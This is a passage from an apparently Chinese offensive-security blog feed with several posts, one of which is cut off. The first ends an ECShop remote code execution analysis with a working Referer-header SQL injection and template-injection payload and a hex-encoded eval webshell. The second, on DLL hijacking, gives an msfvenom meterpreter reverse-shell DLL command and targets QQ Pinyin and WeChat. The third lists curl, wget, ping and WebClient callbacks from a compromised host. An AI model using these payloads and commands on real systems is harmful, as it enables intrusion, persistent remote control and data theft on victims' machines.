class="line"></span><br><span class="line">    $GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'ads'</span>, $ads);</span><br><span class="line">    $val = $GLOBALS[<span class="string">'smarty'</span>]-&gt;fetch($position_style);</span><br><span class="line"></span><br><span class="line">    $GLOBALS[<span class="string">'smarty'</span>]-&gt;caching = $need_cache;</span><br></pre></td></tr></table></figure></p><p>这里将<code>$position_style</code>进行fetch，往上看<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($res <span class="keyword">AS</span> $row)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($row[<span class="string">'position_id'</span>] != $arr[<span class="string">'id'</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $position_style = $row[<span class="string">'position_style'</span>];</span><br></pre></td></tr></table></figure></p><p><code>$position_style</code>是从SQL结果集中取的，所以，我们应该可以控制<br>代码执行点在fetch函数里<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($filename, $cache_id = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_seterror)</span><br><span class="line">        &#123;</span><br><span class="line">            error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_seterror++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strncmp($filename,<span class="string">'str:'</span>, <span class="number">4</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $out = <span class="keyword">$this</span>-&gt;_eval(<span class="keyword">$this</span>-&gt;fetch_str(substr($filename, <span class="number">4</span>)));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>这里之前因为<code>$position_style</code>已经经过了<br><code>$position_style = &#39;str:&#39; . $position_style;</code>的处理<br>所以<code>strncmp($filename,&#39;str:&#39;, 4) == 0</code>肯定是为真的，所以会直接执行代码.<br>但是需要满足<code>fetch_str</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch_str</span><span class="params">($source)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!defined(<span class="string">'ECS_ADMIN'</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            $source = <span class="keyword">$this</span>-&gt;smarty_prefilter_preCompile($source);</span><br><span class="line">        &#125;</span><br><span class="line">        $source=preg_replace(<span class="string">"/([^a-zA-Z0-9_]&#123;1,1&#125;)+(copy|fputs|fopen|file_put_contents|fwrite|eval|phpinfo)+( |\()/is"</span>, <span class="string">""</span>, $source);</span><br><span class="line">        <span class="keyword">if</span>(preg_match_all(<span class="string">'~(&lt;\?(?:\w+|=)?|\?&gt;|language\s*=\s*[\"\']?php[\"\']?)~is'</span>, $source, $sp_match))</span><br><span class="line">        &#123;</span><br><span class="line">            $sp_match[<span class="number">1</span>] = array_unique($sp_match[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">for</span> ($curr_sp = <span class="number">0</span>, $for_max2 = count($sp_match[<span class="number">1</span>]); $curr_sp &lt; $for_max2; $curr_sp++)</span><br><span class="line">            &#123;</span><br><span class="line">                $source = str_replace($sp_match[<span class="number">1</span>][$curr_sp],<span class="string">'%%%SMARTYSP'</span>.$curr_sp.<span class="string">'%%%'</span>,$source);</span><br><span class="line">            &#125;</span><br><span class="line">             <span class="keyword">for</span> ($curr_sp = <span class="number">0</span>, $for_max2 = count($sp_match[<span class="number">1</span>]); $curr_sp &lt; $for_max2; $curr_sp++)</span><br><span class="line">            &#123;</span><br><span class="line">                 $source= str_replace(<span class="string">'%%%SMARTYSP'</span>.$curr_sp.<span class="string">'%%%'</span>, <span class="string">'&lt;?php echo \''</span>.str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, $sp_match[<span class="number">1</span>][$curr_sp]).<span class="string">'\'; ?&gt;'</span>.<span class="string">"\n"</span>, $source);</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> preg_replace(<span class="string">"/&#123;([^\&#125;\&#123;\n]*)&#125;/e"</span>, <span class="string">"\$this-&gt;select('\\1');"</span>, $source);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>在往里面跟，最终是调用了<code>$this-&gt;select()</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($tag)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $tag = stripslashes(trim($tag));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($tag))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&#123;&#125;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span> ($tag&#123;<span class="number">0</span>&#125; == <span class="string">'*'</span> &amp;&amp; substr($tag, <span class="number">-1</span>) == <span class="string">'*'</span>) <span class="comment">// 注释部分</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span> ($tag&#123;<span class="number">0</span>&#125; == <span class="string">'$'</span>) <span class="comment">// 变量</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="comment">//            if(strpos($tag,"'") || strpos($tag,"]"))</span></span><br><span class="line"><span class="comment">//            &#123;</span></span><br><span class="line"><span class="comment">//                 return '';</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&lt;?php echo '</span> . <span class="keyword">$this</span>-&gt;get_val(substr($tag, <span class="number">1</span>)) . <span class="string">'; ?&gt;'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>这里我们能看到曙光了，就是如果第一位是<code>$</code>的话，就返回给_eval函数一个带有php标签的代码，但是还是会经过一个<code>get_val()</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_val</span><span class="params">($val)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strrpos($val, <span class="string">'['</span>) !== <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $val = preg_replace(<span class="string">"/\[([^\[\]]*)\]/eis"</span>, <span class="string">"'.'.str_replace('$','\$','\\1')"</span>, $val);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strrpos($val, <span class="string">'|'</span>) !== <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $moddb = explode(<span class="string">'|'</span>, $val);</span><br><span class="line">            $val = array_shift($moddb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($val))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strpos($val, <span class="string">'.$'</span>) !== <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $all = explode(<span class="string">'.$'</span>, $val);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> ($all <span class="keyword">AS</span> $key =&gt; $val)</span><br><span class="line">            &#123;</span><br><span class="line">                $all[$key] = $key == <span class="number">0</span> ? <span class="keyword">$this</span>-&gt;make_var($val) : <span class="string">'['</span>. <span class="keyword">$this</span>-&gt;make_var($val) . <span class="string">']'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $p = implode(<span class="string">''</span>, $all);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $p = <span class="keyword">$this</span>-&gt;make_var($val);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>当传入的变量没有.$时，调用<code>$this-&gt;make_var</code>，看看make_var<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_var</span><span class="params">($val)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strrpos($val, <span class="string">'.'</span>) === <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_var[$val]) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_patchstack[$val]))</span><br><span class="line">            &#123;</span><br><span class="line">                $val = <span class="keyword">$this</span>-&gt;_patchstack[$val];</span><br><span class="line">            &#125;</span><br><span class="line">            $p = <span class="string">'$this-&gt;_var[\''</span> . $val . <span class="string">'\']'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $t = explode(<span class="string">'.'</span>, $val);</span><br><span class="line">            $_var_name = array_shift($t);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_var[$_var_name]) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_patchstack[$_var_name]))</span><br><span class="line">            &#123;</span><br><span class="line">                $_var_name = <span class="keyword">$this</span>-&gt;_patchstack[$_var_name];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($_var_name == <span class="string">'smarty'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                 $p = <span class="keyword">$this</span>-&gt;_compile_smarty_ref($t);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                $p = <span class="string">'$this-&gt;_var[\''</span> . $_var_name . <span class="string">'\']'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">foreach</span> ($t <span class="keyword">AS</span> $val)</span><br><span class="line">            &#123;</span><br><span class="line">                $p.= <span class="string">'[\''</span> . $val . <span class="string">'\']'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>可以看到最终返回的<code>$p</code>变成了<code>$p = &#39;$this-&gt;_var[\&#39;&#39; . $_var_name . &#39;\&#39;]&#39;</code><br>往回看，我们的select函数return的值就变成了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;_var[<span class="string">'  $val  '</span>];<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>然后结合上面进入函数的条件，我们可以构造payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$abc<span class="string">'];echo phpinfo();//&#125;</span></span><br></pre></td></tr></table></figure></p><p>然后因为不满足fetch_str的正则，加一个<code>/**/</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$abc<span class="string">'];echo phpinfo/**/();//&#125;</span></span><br></pre></td></tr></table></figure></p><p>然后就是利用SQL注入漏洞，让<code>$position_style</code>等于我们的payload了</p><p>最终payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">"num"</span>;s:<span class="number">110</span>:<span class="string">"*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -"</span>;s:<span class="number">2</span>:<span class="string">"id"</span>;s:<span class="number">4</span>:<span class="string">"' /*"</span>;&#125;<span class="number">554</span>fcae493e564ee0dc75bdf2ebf94ca</span><br></pre></td></tr></table></figure></p><p>简单来说就是利用<code>$arr[&#39;id&#39;]</code>和<code>$arr[&#39;num&#39;]</code> 注释掉中间的 <code>order by 和 limit</code>，强制执行UNION，带入<code>position_style</code></p><p>和之前的APT攻击一样，可以直接带入一个无文件Webshell:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7b2461275d3b617373657274286261736536345f6465636f64652827514556575155776f596d467a5a5459305832526c5932396b5a53676b58314250553152624a303576654364644b536b372729293b24615b27317d</span></span><br><span class="line"><span class="comment"># unhex</span></span><br><span class="line">&#123;$a<span class="string">'];assert(base64_decode('</span>QEVWQUwoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ05veCddKSk7<span class="string">'));$a['</span><span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># base64_decode</span></span><br><span class="line">@<span class="keyword">EVAL</span>(base64_decode($_POST[<span class="string">'Nox'</span>]));</span><br></pre></td></tr></table></figure></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>Ecshop 还是见的比较多，用途也比较广，特别是现在各类区块链的网站，用的还是比较多</p><p>3.x同样也可以rce，只是需要精心构造payload，因为需要绕过waf，但是404的师傅说其实将union select通过两个参数传递进去，一个参数传递一个关键字，中间的可以使用<code>/**/</code>注释掉，这样就不会触发WAF了23333</p><h2 id="0x05-Links"><a href="#0x05-Links" class="headerlink" title="0x05 Links"></a>0x05 Links</h2><p><a href="https://paper.seebug.org/695/" target="_blank" rel="noopener">https://paper.seebug.org/695/</a><br><a href="https://xz.aliyun.com/t/2689" target="_blank" rel="noopener">https://xz.aliyun.com/t/2689</a><br><a href="https://www.seebug.org/vuldb/ssvid-97343" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-97343</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-8-27 00:03:02&lt;br&gt;&lt;img src=&quot;/wallpaper/[60268880.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-前言
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://patrilic.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="代码审计" scheme="http://patrilic.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>DLL Hijacking</title>
    <link href="http://patrilic.top/2019/08/23/DLL%20Hijacking/"/>
    <id>http://patrilic.top/2019/08/23/DLL Hijacking/</id>
    <published>2019-08-23T04:18:04.000Z</published>
    <updated>2019-08-27T18:08:49.932Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Authro: Patrilic<br>@Time: 2019-08-23 12:18:04<br><img src="/wallpaper/75773182_p0.jpg" alt></p></blockquote><h2 id="0x00-Introduce"><a href="#0x00-Introduce" class="headerlink" title="0x00 Introduce"></a>0x00 Introduce</h2><p>DLL Hijacking， 顾名思义，就是DLL劫持，利用DLL劫持，可以通过调用恶意dll文件来执行shellcode。<br>所以，DLL是什么呢？<br><a href="https://zh.wikipedia.org/wiki/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93" target="_blank" rel="noopener">维基百科</a></p><p>简单来说，exe文件本身不需要很多函数，而是去调用DLL文件中的函数，当进程运行到需要调用时，就去从文件中调用对应的函数，然后当我们能够中间插入自己的DLL并想办法让程序运行我们的DLL时，就造成了劫持。</p><h2 id="0x01-DLL-Hijacking"><a href="#0x01-DLL-Hijacking" class="headerlink" title="0x01 DLL Hijacking"></a>0x01 DLL Hijacking</h2><p><code>DLL hijacking</code> 在 CWE上又名： <code>Untrusted Search Path Vulnerability</code><br><a href="https://cwe.mitre.org/data/definitions/426.html" target="_blank" rel="noopener">https://cwe.mitre.org/data/definitions/426.html</a></p><p>dll劫持通过利用DLL的加载顺序，让我们的恶意dll在正常的dll前面加载，就可以进行劫持了</p><h3 id="DLL-Search-Order"><a href="#DLL-Search-Order" class="headerlink" title="DLL Search Order"></a>DLL Search Order</h3><p>下面来看一下dll的加载顺序：<br>官方文档： <a href="https://docs.microsoft.com/zh-cn/windows/win32/dlls/dynamic-link-library-search-order" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/dlls/dynamic-link-library-search-order</a></p><p>应用程序可以通过以下方式控制一个DLL的加载路径：使用全路径加载、使用DLL重定向、使用manifest文件。如果上述三种方式均未指定，系统查找DLL的顺序将按照本部分描述的顺序进行。</p><p>然后这里有两个前提条件，对以下两种情况的DLL，程序不会查找，而是直接引用</p><ol><li>对于已经加载到内存中的同名DLL，系统使用已经加载的DLL，并且忽略待加载DLL的路径。（注意对某个进程而言，系统已经加载的DLL一定是唯一的存在于某个目录下。）</li><li>如果该DLL存在于某个Windows版本的已知DLL列表（unkown DLL）中，系统使用已知DLL的拷贝（包括已知DLL的依赖项）。已知DLL列表可以从如下注册表项看到：<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs。<br><img src="/DLL Hijacking.resources/FE85E1B9-4C3C-40C2-8680-64BBCF2D9714.png" alt="0c6f2cf4e21cd827fdff57790b3a5982"></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1.程序所在目录</span><br><span class="line">2.程序加载目录（SetCurrentDirectory）</span><br><span class="line">3.系统目录即 SYSTEM32 目录</span><br><span class="line">4.16位系统目录即 SYSTEM 目录</span><br><span class="line">5.Windows目录</span><br><span class="line">6.PATH环境变量中列出的目录</span><br></pre></td></tr></table></figure><p>我们使用<code>ProcessMonitor</code>来监控进程<br>可以通过👉<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procmon" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procmon</a>下载</p><h3 id="Do-it"><a href="#Do-it" class="headerlink" title="Do it"></a>Do it</h3><p>这里使用自动化的审计工具进行DLL劫持分析<br>推荐Windows下使用<code>Dll Hijack Auditor</code></p><p>我们以Vc++6.0编辑器为例<br><img src="/DLL Hijacking.resources/D23C6ACE-1F0D-498E-BF55-353C064EEAAF.png" alt="fec186d523049fcb19d40672cee5dd97"></p><p>生成报告</p><p><img src="/DLL Hijacking.resources/54857F75-C5A0-48E1-9CEF-0EDA6FA7CA1A.png" alt="d09587368427f553d0cb26464aed4cb3"><br>我们可以看到存在dll可以劫持</p><p>然而这个我发现，好像并不能使用2333<br>那要怎么手动寻找呢？反正DLL的加载，我们只需要从程序已经加载的DLL列表中，查找在“KnownDLLs注册表项”中不存在的DLL。<br>然后将恶意dll放在程序当前目录即可</p><p>然后还有两个利器：</p><blockquote><p>Robber <a href="https://github.com/MojtabaTajik/Robber" target="_blank" rel="noopener">https://github.com/MojtabaTajik/Robber</a><br>Rattler <a href="https://github.com/sensepost/rattler" target="_blank" rel="noopener">https://github.com/sensepost/rattler</a></p></blockquote><h3 id="Hack-it"><a href="#Hack-it" class="headerlink" title="Hack it"></a>Hack it</h3><p>用倾旋师傅之前找到的<code>QQpinyin</code>来做一个演示<br><a href="https://payloads.online/archivers/2018-06-09/1" target="_blank" rel="noopener">https://payloads.online/archivers/2018-06-09/1</a></p><h4 id="Msf"><a href="#Msf" class="headerlink" title="Msf"></a>Msf</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=182.168.0.101 LPORT=10001 -f dll &gt; ntmarta.dll</span><br></pre></td></tr></table></figure><p><img src="/DLL Hijacking.resources/9FB73E4A-74F4-4249-BD44-673EEE8A9EEC.png" alt="a0ea9b499f1498e7e373e0b512242577"></p><h4 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h4><p><img src="/DLL Hijacking.resources/6D6847BA-6F9A-4355-AE3D-363C27F39C9F.png" alt="278aa9975763a654cec4763eb5ab3792"><br>同样的操作，反弹beacon<br><img src="/DLL Hijacking.resources/1ED21E64-7A9E-410D-A239-50D5CDD5D592.png" alt="9f382d5e297f99185e2a16bd456773b4"></p><h3 id="Weixin-DLL-Hijacking"><a href="#Weixin-DLL-Hijacking" class="headerlink" title="Weixin DLL Hijacking"></a>Weixin DLL Hijacking</h3><p>微信PC版相信还是用的比较多的，也常常能在一些公司电脑上看到，所以还是比较有意义的<br><img src="/DLL Hijacking.resources/3A39C9B1-24B6-4F0A-9F6E-BD1889CAAAA7.png" alt="93bf7e673548524925a9b63f75a3cf5a"><br>当然，ProcessMonitor也能看到<br><img src="/DLL Hijacking.resources/12CDE5AD-5981-4771-8F6D-8082FDF95749.png" alt="d4f968dca3dd7e6f373693bcfc79fc31"><br>构造payload劫持即可<br><img src="/DLL Hijacking.resources/FCEBA963-4F3C-4F21-A968-E08EFC4741B6.png" alt="f17d81c5fc84f728b4f876ed68c2e51d"></p><h2 id="0x02-Summary"><a href="#0x02-Summary" class="headerlink" title="0x02 Summary"></a>0x02 Summary</h2><p>DLL劫持也是老的不行的一个漏洞了，但是在进行维权，持续渗透的方面，一直都比较厉害。<br>真实环境下，我们可以制作一个加密的DLL文件，从DLLMain里进行调用，回弹shell的同时，也完成程序的正常功能，特别是针对用户常用软件的DLL劫持～虚浮了</p><h2 id="0x03-Other-to-Learn"><a href="#0x03-Other-to-Learn" class="headerlink" title="0x03 Other to Learn"></a>0x03 Other to Learn</h2><p><a href="https://www.52pojie.cn/thread-830796-1-1.html" target="_blank" rel="noopener">一种通用DLL劫持技术研究</a><br><a href="https://www.cnblogs.com/h2zZhou/p/8601375.html" target="_blank" rel="noopener">老树开新花：DLL劫持漏洞新玩法</a><br><a href="http://www.anquan.us/static/drops/tips-13238.html" target="_blank" rel="noopener">深入解析DLL劫持漏洞</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Authro: Patrilic&lt;br&gt;@Time: 2019-08-23 12:18:04&lt;br&gt;&lt;img src=&quot;/wallpaper/75773182_p0.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00
      
    
    </summary>
    
      <category term="ATT&amp;CK" scheme="http://patrilic.top/categories/ATT-CK/"/>
    
    
      <category term="DLL Hijacking" scheme="http://patrilic.top/tags/DLL-Hijacking/"/>
    
  </entry>
  
  <entry>
    <title>寻找内网出口ip</title>
    <link href="http://patrilic.top/2019/08/20/%E5%AF%BB%E6%89%BE%E5%86%85%E7%BD%91%E5%87%BA%E5%8F%A3ip/"/>
    <id>http://patrilic.top/2019/08/20/寻找内网出口ip/</id>
    <published>2019-08-20T12:14:23.000Z</published>
    <updated>2019-08-26T14:45:31.535Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-8-20 20:14:23<br><img src="/wallpaper/30597.jpg" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>晚上吃了饭回酒店，一觉睡醒，发现有个师傅问我windows机器只有webshell怎么找内网的出口ip，想了想确实没总结过这个东西（主要是平时都是直接反弹个shell了..）</p><p>仔细想想，其实挺好玩的，然后就和几个师傅讨论了下，感觉大概就下面这几种方式，如果有不足请师傅补充～</p><h2 id="0x01-Linux"><a href="#0x01-Linux" class="headerlink" title="0x01 Linux"></a>0x01 Linux</h2><p>Linux 由于基本自带 <code>curl</code>和<code>wget</code>,<code>telnet</code>命令，所以还是比较简单的</p><h3 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl cip.cc</span><br></pre></td></tr></table></figure><p><img src="/如何寻找内网出口ip.resources/F90295F8-F123-4CB2-B957-05DD554F0EA4.png" alt="e6ee0f98f7abc8edc984f243e1c42370"></p><h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet cip.cc</span><br></pre></td></tr></table></figure><p><img src="/如何寻找内网出口ip.resources/64B82503-12DC-42B1-AF78-AD72FA1B84F8.png" alt="1ba6f6948d7f30c013c7a0e680e26d18"></p><h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><p>利用nc监听端口，然后linux端使用wget命令即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget xxx.xxx.xxx.xxx:90</span><br></pre></td></tr></table></figure><p><img src="/如何寻找内网出口ip.resources/B7E37635-F0C6-4083-9EE4-E925957C12B1.png" alt="34f53887bd6dfad3b33469c64b746c45"></p><h3 id="ping（linux-windows通用）"><a href="#ping（linux-windows通用）" class="headerlink" title="ping（linux windows通用）"></a>ping（linux windows通用）</h3><p>结合ceye</p><p>直接执行ping命令，走<code>DNS Query</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping metzl4.ceye.io</span><br></pre></td></tr></table></figure></p><p><img src="/如何寻找内网出口ip.resources/B51E2419-7B28-4CDE-8B1B-DAF2924545D1.png" alt="f3cc55ed09188d082f807b70cbbb4b37"></p><h2 id="0x02-Windows"><a href="#0x02-Windows" class="headerlink" title="0x02 Windows"></a>0x02 Windows</h2><h3 id="WebClient"><a href="#WebClient" class="headerlink" title="WebClient"></a>WebClient</h3><p>和<code>Wget</code>一个原理，我们平时经常会使用下面的语句进行文件传输<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">New-Object</span> System.Net.WebClient).DownloadFile(<span class="string">"http://xxx.xxx.xxx.xxx/nc.exe"</span>,<span 